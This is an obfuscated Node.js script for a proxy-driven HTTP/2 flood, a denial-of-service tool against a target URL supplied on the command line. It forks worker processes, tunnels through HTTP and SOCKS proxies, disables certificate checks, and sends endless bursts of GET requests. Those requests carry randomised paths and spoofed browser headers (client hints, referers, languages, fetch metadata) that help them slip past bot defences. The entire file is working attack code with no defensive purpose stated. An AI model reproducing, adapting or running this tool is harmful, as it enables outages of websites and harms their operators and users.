const errorHandler = _0x19cdf1 => {
  return _0x19cdf1;
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
const crypto = require("crypto"),
  net = require("net"),
  http2 = require("http2"),
  tls = require("tls"),
  cluster = require("cluster");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
const args = {
    "url": process.argv[2],
    "duration": process.argv[3] * 1000,
    "rates": +process.argv[4],
    "threads": +process.argv[5],
    "proxyAddress": process.argv[6],
    "userAgent": process.argv[7],
    "cookie": process.argv[8],
    "protocol": process.argv[9]
  },
  characters = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM",
  randInt = (_0x179759, _0x3d7d4b) => Math.floor(Math.random() * (_0x3d7d4b - _0x179759 + 1) + _0x179759),
  randList = _0x161d2b => _0x161d2b[Math.floor(Math.random() * _0x161d2b.length)],
  target = new URL(args.url);
target.path = target.pathname + target.search;
Array.prototype.delete = function (_0x5a0030) {
  this.splice(this.indexOf(_0x5a0030), 1);
};
Array.prototype.shuffle = function () {
  return this.sort(_0x1816c4 => Math.random() - 0.5);
};
Object.prototype.shuffle = function () {
  const _0x179bc7 = {};
  return Object.keys(this).shuffle().forEach(_0x481a24 => _0x179bc7[_0x481a24] = this[_0x481a24]), _0x179bc7;
};
const clientHints = ["\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"<version>\", \"Chromium\";v=\"<version>\"", "\"Chromium\";v=\"<version>\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"<version>\"", "\"Google Chrome\";v=\"<version>\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"<version>\"", "\"Chromium\";v=\"<version>\", \"Google Chrome\";v=\"<version>\", \"Not=A?Brand\";v=\"99\"", "\"Google Chrome\";v=\"<version>\", \"Chromium\";v=\"<version>\", \"Not?A_Brand\";v=\"24\"", "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"<version>\", \"Google Chrome\";v=\"<version>\""],
  platforms = ["\"Windows\"", "\"Linux\"", "\"Android\"", "\"macOS\"", "\"iOS\""],
  referers = [target.origin, "https://www.google.com", "https://www.bing.com", "https://coccoc.com", "https://es.wikipedia.org", "https://en.wikipedia.org", "https://duckduckgo.com", "https://new.qq.com", "https://www.ecosia.org", "https://search.naver.com", "https://yandex.com", "https://www.baidu.com", "https://search.yahoo.com"],
  encodings = ["gzip", "gzip, deflate", "gzip, deflate, br"],
  languages = ["en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9", "it-IT,it;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9", "ru-RU,ru;q=0.9", "ar-SA,ar;q=0.9", "hi-IN,hi;q=0.9", "ur-PK,ur;q=0.9", "tr-TR,tr;q=0.9", "id-ID,id;q=0.9", "nl-NL,nl;q=0.9", "sv-SE,sv;q=0.9", "no-NO,no;q=0.9", "da-DK,da;q=0.9", "fi-FI,fi;q=0.9", "pl-PL,pl;q=0.9", "cs-CZ,cs;q=0.9", "hu-HU,hu;q=0.9", "el-GR,el;q=0.9", "pt-PT,pt;q=0.9", "th-TH,th;q=0.9", "vi-VN,vi;q=0.9", "he-IL,he;q=0.9", "fa-IR,fa;q=0.9", "ur-IN,ur;q=0.9", "ro-RO,ro;q=0.9", "bg-BG,bg;q=0.9", "hr-HR,hr;q=0.9", "sk-SK,sk;q=0.9", "sl-SI,sl;q=0.9", "sr-RS,sr;q=0.9", "uk-UA,uk;q=0.9", "et-EE,et;q=0.9", "lv-LV,lv;q=0.9", "lt-LT,lt;q=0.9", "ms-MY,ms;q=0.9", "fil-PH,fil;q=0.9", "zh-TW,zh;q=0.9", "es-AR,es;q=0.9", "en,en-US;q=0.9", "en,en-GB;q=0.9", "en,fr-FR;q=0.9", "en,de;q=0.9", "en,it;q=0.9", "en,fr-CA;q=0.9", "vi,fr-FR;q=0.9", "en,tr;q=0.9", "en,ru;q=0.9", "fr-CH,fr;q=0.9", "en-CA,en;q=0.9", "en-AU,en;q=0.9", "en-NZ,en;q=0.9", "en-ZA,en;q=0.9", "en-IE,en;q=0.9", "en-IN,en;q=0.9", "ca-ES,ca;q=0.9", "cy-GB,cy;q=0.9", "eu-ES,eu;q=0.9", "gl-ES,gl;q=0.9", "gu-IN,gu;q=0.9", "kn-IN,kn;q=0.9", "ml-IN,ml;q=0.9", "mr-IN,mr;q=0.9", "nb-NO,nb;q=0.9", "nn-NO,nn;q=0.9", "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", "te-IN,te;q=0.9", "zh-HK,zh;q=0.9"],
  metadata = {
    "site": ["cross-site", "same-site", "same-origin", "none"],
    "mode": ["cors", "no-cors", "navigate", "same-origin", "websocket"],
    "dest": ["document", "empty", "iframe", "font", "image", "script"]
  };
function path(_0x532ee5, _0x23640e) {
  let _0x4d7c74 = "";
  for (let _0x197ed3 = 0; _0x197ed3 < _0x23640e; _0x197ed3++) {
    _0x4d7c74 += randList(characters);
  }
  return _0x532ee5.replace(/=RAND=/g, _0x4d7c74);
}
function randHeaders(_0xed7d9d, _0x1753bc) {
  const _0x3e8749 = Object.keys(_0xed7d9d),
    _0x41b432 = {};
  for (let _0x5d89f7 = 0; _0x5d89f7 < _0x1753bc; _0x5d89f7++) {
    const _0x34aa54 = randList(_0x3e8749);
    _0x3e8749.delete(_0x34aa54);
    _0x41b432[_0x34aa54] = _0xed7d9d[_0x34aa54];
  }
  return _0x41b432;
}
function parseVersion(_0x1e2b28, _0x357217, _0x45f9dc) {
  const _0x10d013 = randInt(_0x357217, _0x45f9dc);
  return _0x1e2b28.replace(/<version>/g, _0x10d013);
}
function createSocket() {
  const _0x3b983e = new net.Socket();
  return _0x3b983e.allowHalfOpen = true, _0x3b983e.writable = true, _0x3b983e.readable = true, _0x3b983e.setNoDelay(true), _0x3b983e.setKeepAlive(true, args.duration), _0x3b983e;
}
class Tunnel {
  ["HTTP"](_0x2e2342) {
    const _0x2d45b9 = Buffer.from("CONNECT " + _0x2e2342.address + " HTTP/1.1\r\nHost: " + _0x2e2342.address + "\r\nConnection: Keep-Alive\r\n\r\n", "ascii"),
      _0x480372 = createSocket();
    _0x480372.connect(_0x2e2342.port, _0x2e2342.host);
    const _0x4b3072 = setTimeout(function () {
      _0x480372.destroy();
    }, _0x2e2342.timeout);
    _0x480372.once("connect", function () {
      clearTimeout(_0x4b3072);
      _0x480372.write(_0x2d45b9);
    });
    _0x480372.once("data", _0x260b76 => {
      _0x260b76.toString().indexOf("HTTP/1.1 200") === -1 ? _0x480372.destroy() : _0x2e2342.handler(_0x480372);
    });
  }
  ["SOCKS4"](_0x584923) {
    const _0x3da596 = _0x584923.address.split(":"),
      _0x462fa4 = _0x3da596[0],
      _0x3b30d3 = +_0x3da596[1],
      _0x3e6e1f = Buffer.alloc(10 + _0x462fa4.length);
    _0x3e6e1f[0] = 4;
    _0x3e6e1f[1] = 1;
    _0x3e6e1f[2] = _0x3b30d3 >> 8;
    _0x3e6e1f[3] = _0x3b30d3 & 255;
    _0x3e6e1f[4] = 0;
    _0x3e6e1f[5] = 0;
    _0x3e6e1f[6] = 0;
    _0x3e6e1f[7] = 1;
    _0x3e6e1f[8] = 0;
    Buffer.from(_0x462fa4, "ascii").copy(_0x3e6e1f, 9, 0, _0x462fa4.length);
    _0x3e6e1f[_0x3e6e1f.length - 1] = 0;
    const _0x38b619 = createSocket();
    _0x38b619.connect(_0x584923.port, _0x584923.host);
    const _0x2cc6d6 = setTimeout(function () {
      _0x38b619.destroy();
    }, _0x584923.timeout);
    _0x38b619.once("connect", function () {
      clearTimeout(_0x2cc6d6);
      _0x38b619.write(_0x3e6e1f);
    });
    _0x38b619.once("data", _0x175e97 => {
      _0x175e97.length !== 8 || _0x175e97[1] !== 90 ? _0x38b619.destroy() : _0x584923.handler(_0x38b619);
    });
  }
  ["SOCKS5"](_0xee3ab2) {
    const _0x4e86e3 = _0xee3ab2.address.split(":"),
      _0x5d9bdb = _0x4e86e3[0],
      _0x5ccf02 = +_0x4e86e3[1],
      _0x4741b5 = Buffer.from([5, 1, 0]),
      _0x14f30a = Buffer.alloc(_0x5d9bdb.length + 7);
    _0x14f30a[0] = 5;
    _0x14f30a[1] = 1;
    _0x14f30a[2] = 0;
    _0x14f30a[3] = 3;
    _0x14f30a[4] = _0x5d9bdb.length;
    Buffer.from(_0x5d9bdb, "ascii").copy(_0x14f30a, 5, 0, _0x5d9bdb.length);
    _0x14f30a[_0x14f30a.length - 2] = _0x5ccf02 >> 8;
    _0x14f30a[_0x14f30a.length - 1] = _0x5ccf02 & 255;
    const _0xd459b1 = createSocket();
    _0xd459b1.connect(_0xee3ab2.port, _0xee3ab2.host);
    const _0x42f8da = setTimeout(function () {
      _0xd459b1.destroy();
    }, _0xee3ab2.timeout);
    _0xd459b1.once("connect", function () {
      clearTimeout(_0x42f8da);
      _0xd459b1.write(_0x4741b5);
    });
    _0xd459b1.once("data", _0x13efce => {
      if (_0x13efce.length !== 2 || _0x13efce[0] !== 5 || _0x13efce[1] !== 0) {
        _0xd459b1.destroy();
        return;
      }
      _0xd459b1.write(_0x14f30a);
      _0xd459b1.once("data", _0x1e6f6b => {
        _0x1e6f6b[0] !== 5 || _0x1e6f6b[1] !== 0 ? _0xd459b1.destroy() : _0xee3ab2.handler(_0xd459b1);
      });
    });
  }
}
const tunnel = new Tunnel(),
  protocols = {
    "http": tunnel.HTTP,
    "socks4": tunnel.SOCKS4,
    "socks5": tunnel.SOCKS5
  };
function handler(_0x319cf8) {
  const _0xe08927 = tls.connect(443, target.host, {
      "ALPNProtocols": ["h2"],
      "servername": target.host,
      "rejectUnauthorized": false,
      "secureProtocol": "TLS_method",
      "socket": _0x319cf8,
      "ecdhCurve": "x25519:secp256r1:secp384r1",
      "ciphers": "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA",
      "secureOptions": crypto.constants.SSL_OP_ALL | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
    }),
    _0x245a3f = http2.connect(target.href, {
      "settings": {
        "headerTableSize": 65536,
        "enablePush": false,
        "initialWindowSize": 6291456,
        "maxHeaderListSize": 262144
      },
      "maxDeflateDynamicTableSize": 4294967295,
      "maxSessionMemory": 1000,
      "createConnection": () => _0xe08927
    });
  _0x245a3f.on("connect", _0xb6b1d6 => {
    _0xb6b1d6.setLocalWindowSize(15728640);
    const _0x751292 = {
      "clientHints": {
        "sec-ch-ua": parseVersion(randList(clientHints), 90, 120),
        "sec-ch-ua-mobile": "?" + randInt(0, 1),
        "sec-ch-ua-platform": randList(platforms)
      },
      "paddingHeaders": {
        "upgrade-insecure-requests": "1",
        "referer": randList(referers) + "/",
        "cache-control": "max-age=0"
      },
      "accepts": {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-encoding": randList(encodings),
        "accept-language": randList(languages) + ",fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
      },
      "metadataHeaders": {
        "sec-fetch-site": randList(metadata.site),
        "sec-fetch-mode": randList(metadata.mode),
        "sec-fetch-dest": randList(metadata.dest)
      }
    };
    setInterval(function () {
      const _0x32ba10 = {
        ":method": "GET",
        ":authority": target.host,
        ":scheme": "https",
        ":path": path(target.path, 8),
        "cookie": args.cookie,
        "user-agent": args.userAgent,
        ...randHeaders(_0x751292.accepts, 1),
        ...randHeaders(_0x751292.clientHints, 1),
        ...randHeaders(_0x751292.paddingHeaders, 1),
        ...randHeaders(_0x751292.metadataHeaders, 1)
      };
      for (let _0x423a52 = 0; _0x423a52 < args.rates; _0x423a52++) {
        const _0x492b60 = {
            "weight": randInt(128, 256),
            "parent": 0,
            "exclusive": false
          },
          _0x3c8c5b = _0xb6b1d6.request(_0x32ba10, _0x492b60);
        _0x492b60.weight = randInt(128, 256);
        _0x3c8c5b.priority(_0x492b60);
        var _0x57eedc = "";
        _0x3c8c5b.on("data", _0x2e68db => _0x57eedc += _0x2e68db);
        _0x3c8c5b.on("end", function () {
          _0x3c8c5b.destroy();
        });
        _0x3c8c5b.end();
      }
    }, 1000);
  });
  _0x245a3f.on("error", errorHandler);
}
function prepareAttack() {
  const _0x4ed5ae = args.proxyAddress.split(":"),
    _0xf5bff6 = {
      "host": _0x4ed5ae[0],
      "port": +_0x4ed5ae[1],
      "address": target.host + ":443",
      "timeout": 30000,
      "handler": handler
    };
  protocols[args.protocol](_0xf5bff6);
}
if (cluster.isPrimary) {
  setTimeout(function () {
    process.exit(0);
  }, args.duration);
  for (let threads = 1; threads <= args.threads; threads++) {
    cluster.fork();
  }
} else setInterval(prepareAttack);